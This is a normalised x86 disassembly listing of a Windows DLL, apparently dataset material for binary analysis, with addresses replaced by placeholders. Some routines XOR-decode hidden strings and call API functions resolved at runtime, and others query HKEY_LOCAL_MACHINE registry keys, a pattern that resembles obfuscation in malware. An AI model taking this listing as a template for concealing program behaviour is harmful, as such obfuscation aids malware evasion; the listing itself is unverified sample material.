call sub_100029ad
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1002b141
pop ecx
push 0x3
call sub_1003c405
int3
push 0x1
push 0x40000015
push 0x3
call sub_10007adc
add esp 0xc
sub_1001b2e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ esp + 0x18 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ esp + 0x2c ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x3
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_1001b3e0
push ebp
mov ebp esp
sub esp 0x42c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
lea edx [ ebp - 0x418 ]
push edx
push 0x20119
xor esi esi
push esi
push ecx
push eax
mov [ ebp - 0x41c ] esi
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x418 ]
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x420 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x420 ] esi
jbe r-xdata
mov edx [ ebp - 0x418 ]
push edx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x418 ]
push ecx
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x41c ]
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x424 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea edx [ ebp - 0x42c ]
push edx
mov edx [ ebp - 0x418 ]
push 0x0
lea eax [ ebp - 0x428 ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
push esi
push edx
mov [ ebp - 0x428 ] 0x104
mov [ ebp - 0x424 ] 0x208
call edi
test eax eax
jne r-xdata
inc esi
cmp esi [ ebp - 0x420 ]
jb r-xdata
cmp [ ebp - 0x42c ] 0x1
jne r-xdata
jmp r-xdata
push ebx
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
pop edi
mov [ ebp - 0x41c ] 0x1
sub_1001b50a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100515d7
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_1001b560
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x70 ] ecx
push edi
mov ecx ebx
mov [ ebp - 0x68 ] eax
call sub_10048110
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
xor edi edi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x64 ] edi
mov edx [ eax ]
mov edx [ edx + 0x88 ]
push ecx
push eax
call edx
test eax eax
jns r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xc0
call sub_100050e0
mov eax 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x64 ]
push eax
call [ SysStringLen@IAT ]
mov esi eax
mov [ ebp - 0x6c ] esi
cmp [ ebx + 0x140 ] edi
je r-xdata
lea edx [ ebp - 0x58 ]
mov eax 0x110
call sub_100050e0
lea eax [ edi + 0x2 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
add esi edi
add esi esi
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
push r--data
call [ lstrlenA@IAT ]
mov edi eax
cmp [ ebx + 0x140 ] 0x0
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x10a
call sub_100050e0
mov eax 0x3
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x64 ]
lea eax [ edx + edx ]
mov edx [ ebp - 0x68 ]
push eax
mov eax [ edx ]
push ecx
add eax edi
push eax
call sub_100796a0
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x70 ]
add esp 0xc
mov [ ecx ] esi
test eax eax
je r-xdata
push edi
push r--data
push eax
call sub_100796a0
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push eax
call [ SysFreeString@IAT ]
sub_1001b6b0
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0x18
mov esi ecx
call sub_10055606
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] edx
call sub_10008757
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_1000bd19
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov edx [ esi ]
mov [ ecx ] edx
mov dl [ esi + 0x4 ]
mov [ ecx + 0x4 ] dl
sub_1001b720
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
xor eax eax
test edx edx
je r-xdata
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov ecx edi
lea esp [ esp ]
cmp eax 0xffffffff
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
pop edi
pop ebx
lea ecx [ edi + eax * 4 ]
sub edx eax
lea eax [ edx * 4 - 0x4 ]
push eax
lea edx [ ecx + 0x4 ]
push edx
push ecx
call sub_10078db0
add esp 0xc
dec [ esi + 0x4 ]
cmp [ ecx ] ebx
je r-xdata
pop edi
pop ebx
pop esi
pop ebp
retn
sub_1001b780
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_10057c30
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1001b7a4
push 0x58
mov eax sub_1007f986
call sub_1001bb6b
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_100688a0
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10004f60
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_10069ce0
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx ebx [ ebp + 0x1c ]
mov edx [ ecx ]
push ebx
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ edx + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10028071
mov [ ebp - 0x4 ] 0x3
call sub_1004ff82
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1004fa89
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_10036380
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10020b50
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x54 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_100224ec
mov ecx [ eax ]
push edi
push [ ebp - 0x54 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_100582fb
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10020b50
mov eax [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_1001b901
push 0x38
mov eax sub_1007f481
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10059065
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1002c25c
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1001b9af
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10021302
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1001ba4c
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_1001bb10
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ eax + eax ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_10078db0
add esp 0xc
pop ebp
retn
sub_1001bb2c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_1001bb6b
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001bbb0
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov esi ecx
mov ecx [ eax + 0x110 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x4
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x210 ]
push edx
call [ StrCpyW@IAT ]
lea ebx [ ebp - 0x210 ]
xor esi esi
call sub_10023140
test eax eax
jne r-xdata
mov edi [ rw-data ]
xor eax eax
mov [ edi + 0x104 ] eax
mov [ edi + 0x10c ] eax
mov [ edi + 0x108 ] 0x1
call sub_100010b0
mov eax [ rw-data ]
mov ecx [ eax + 0x110 ]
push ecx
call [ ReleaseMutex@IAT ]
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_1001bc90
push ebp
mov ebp esp
sub esp 0x2b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x44 ]
push edx
push 0x80000002
mov [ ebp - 0x12 ] ax
call esi
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x5
call sub_100429d0
lea ecx [ ebp - 0x2ac ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ ebp - 0x2ac ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2a8 ]
[ edi ]
lea edx [ ebp - 0x68 ]
mov eax 0x9
mov [ ebp - 0x2b0 ] 0x206
call sub_100429d0
lea eax [ ebp - 0x2b0 ]
push eax
mov eax [ ebp - 0x2ac ]
lea ecx [ ebp - 0x2a8 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
pop edi
test eax eax
je r-xdata
lea edx [ ebp - 0x2a8 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x27
call sub_100429d0
mov eax edx
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
call sub_1005dcbd
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x2ac ]
push ecx
jmp r-xdata
mov eax [ ebp - 0x2ac ]
push eax
mov edx [ ebp - 0x2ac ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call [ RegCloseKey@IAT ]
sub_1001be10
push ebp
mov ebp esp
push 0xffffffff
push sub_10082ec9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x20
mov esi ecx
mov [ ebp - 0x9c ] ebx
call sub_10055606
mov edi eax
add esp 0x4
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
xor edi edi
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
push 0x9
push r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100531b0
mov [ edi + 0x1c ] ebx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x24
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x4
mov [ ebp - 0x1e ] ax
jne r-xdata
test [ ebp + 0x8 ] 0x10
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x75
call sub_10013830
lea edx [ ebp - 0x50 ]
mov eax 0x113
call sub_10013830
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001c3a0
test [ ebp + 0x8 ] 0x20
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x109
call sub_10013830
lea edx [ ebp - 0x58 ]
mov eax 0x6b
call sub_10013830
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001c3a0
test [ ebp + 0x8 ] 0x8
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xd1
call sub_10013830
lea edx [ ebp - 0x5c ]
mov eax 0x146
call sub_10013830
mov eax edx
push eax
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001c3a0
test [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x65
call sub_10013830
lea edx [ ebp - 0x58 ]
mov eax 0xfd
call sub_10013830
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001c3a0
test [ ebp + 0x8 ] 0x2
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xed
call sub_10013830
lea edx [ ebp - 0x5c ]
mov eax 0xcf
call sub_10013830
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001c3a0
push edi
call sub_10050ac0
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x127
call sub_10013830
lea edx [ ebp - 0x98 ]
mov eax 0xca
call sub_10013830
mov eax edx
push eax
lea edx [ ebp - 0x68 ]
lea ecx [ ebp - 0x2c ]
call sub_1001c3a0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push edi
mov [ edi ] cx
call sub_1006591f
add esp 0x4
mov eax [ edi ]
push eax
call sub_1006591f
add esp 0x4
sub_1001c024
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005154d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1001c0c1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_1001c0f0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
mov [ ebp - 0x54 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7d
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x54 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x5c ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x5c ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
push edi
sar eax 0x1
push eax
push edx
lea ecx [ ebx + 0xe8 ]
call sub_100531b0
mov ecx [ ebp - 0x5c ]
mov edi [ SysFreeString@IAT ]
push ecx
call edi
mov eax [ ebp - 0x54 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
lea edx [ ebp - 0x50 ]
mov eax 0x10
mov [ ebp - 0x54 ] 0x0
call sub_100050e0
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x54 ]
push edx
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x58 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x60 ] ecx
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0x60 ]
lea ecx [ ebx + 0x104 ]
sar eax 0x1
push eax
push edx
call sub_100531b0
mov edx [ ebp - 0x58 ]
push edx
call edi
mov eax [ ebp - 0x54 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebx + 0xf8 ]
push r--data
xor edi edi
lea ecx [ ebx + 0xe8 ]
mov [ ebp - 0x54 ] 0x0
call sub_10039b60
test eax eax
jne r-xdata
mov eax [ ebx + 0x114 ]
push r--data
xor edi edi
lea ecx [ ebx + 0x104 ]
call sub_10039b60
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
xor ecx ebp
add eax 0x4
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001c2b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007edc0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_10048240
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1001c34c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001928c
add esp 0x1c
pop ebp
retn
sub_1001c36f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
